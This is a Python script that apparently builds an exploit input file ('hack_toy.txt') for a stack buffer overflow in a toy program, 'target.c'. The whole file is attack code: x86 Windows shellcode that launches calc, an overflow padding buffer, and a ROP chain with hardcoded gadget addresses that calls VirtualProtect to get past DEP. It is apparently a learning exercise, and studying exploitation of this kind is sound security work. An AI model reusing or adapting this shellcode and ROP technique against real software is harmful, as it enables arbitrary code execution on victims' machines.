import random,struct
print("attack target.c")

shellcode1=b"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
shellcode1+=b"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
shellcode1+=b"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
shellcode1+=b"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
shellcode1+=b"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
shellcode1+=b"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7"

buf= b"12345678123456781234567812345678123456781234567890ABCDEFGHIGKLMABCDEFGHHIJKLMNOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#stack_frame=shellcode1+buf[len(shellcode1):1044]
stack_frame=buf[0:1044]

print(len(stack_frame))
print(len(shellcode1))

VirtualProtect=b'\xd4\x1a\x80\x7c' #0x7c801ad4
shellcode_addr=b'\x24\xeb\x22\x00'   #ESP+20 0x0022EB10(16)+20(10)=0x0022EB24
VirtualProtect_lpaddress=b'\x24\xeb\x22\x00'   #ESP+20 0x0022EB10(16)+20(10)=0x0022EB24
VirtualProtect_dwsize=b'\x6A\x10\x10\x10'  #343 0x00000157 #74 0x000008A
VirtualProtect_flnewProtect=b'\x40\x00\x00\x00' #PAGE_EXECUTE_READWRITE 0x00000040
VirtualProtect_floldprotect=b'\x40\x00\x00\x00' #PAGE_EXECUTE_READWRITE 0x00000040

#edi rop_nop
#esi VirtualProtect
#ebp shellcode_addr
#esp lpaddress
#ebx dwsize
#edx flnewprotect
#ecx floldprotect
#eax rop_nop or addr of VirtualProtect in stack

#-----------------------[rop_nop  -> edi]-#
rop=struct.pack('<L',0x77BF3B47) #POP EDI#RETN
rop+=struct.pack('<L',0x77BF72D5) #rop_nop#retn
#-----------------------[VirtualProtect (0x7c801ad4) -> esi]-#
rop+=struct.pack('<L',0x7c921D52) #POP ESI#RETN
rop+=struct.pack('<L',0x7c801ad4) #VirtualProtect

#-----------------------[JMP ESP (0x7C874413) -> ebp]-#
#rop+=struct.pack('<L',0x7c992F26) #POP EBP#RETN
#rop+=struct.pack('<L',0x0022ef90) #shellcode_addr
#rop+=struct.pack('<L',0x7c836a08) #call esp
#rop+=struct.pack('<L',0x7c874413) #jmp esp
rop+=struct.pack('<L',0x77C221EE) # POP ECX # RETN
rop+=struct.pack('<L',0x801177d0) #
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77c09bb5) #mov eax, ecx #retn
rop+=struct.pack('<L',0x7c954529) #xchg eax, ebp#retn

#-----------------------[lpaddress  -> ESP]-#
#leave it

#-----------------------[dwsize (0x000008A) -> ebx]-#
rop+=struct.pack('<L',0x77BF362C) #POP EBX#RETN
rop+=struct.pack('<L',0x10101010) #

#-----------------------[flnewprotect (0x00000040) -> edx]-#
rop+=struct.pack('<L',0x77C221EE) # POP ECX # RETN ???
rop+=struct.pack('<L',0xffffffff) # ->0x40
rop+=struct.pack('<L',0x7C98301F) #INC ECX #RETN
rop+=struct.pack('<L',0x7C98301F) #INC ECX #RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN 2^6 0x40
rop+=struct.pack('<L',0x7C922B50) #MOV EDX,ECX#RETN flProtect (0x40) -> EDX
#-----------------------[floldprotect (0x00000040) -> ecx]-#
#-----------------------[rop_nop () -> eax]-#
rop+=struct.pack('<L',0x77BF1D16) #POP EAX#RETN
rop+=struct.pack('<L',0x77Bf72D5) #NOP#RETN

#-----------------------[pushad]-#
rop+=struct.pack('<L',0x77C267F0) # PUSHAD # ADD AL,0EF # RETN


file=open('hack_toy.txt','wb')
file.write(stack_frame);
file.write(b"\x41\x42\x43\x44"); #EBP
file.write(rop);
file.write(shellcode1);
file.close();


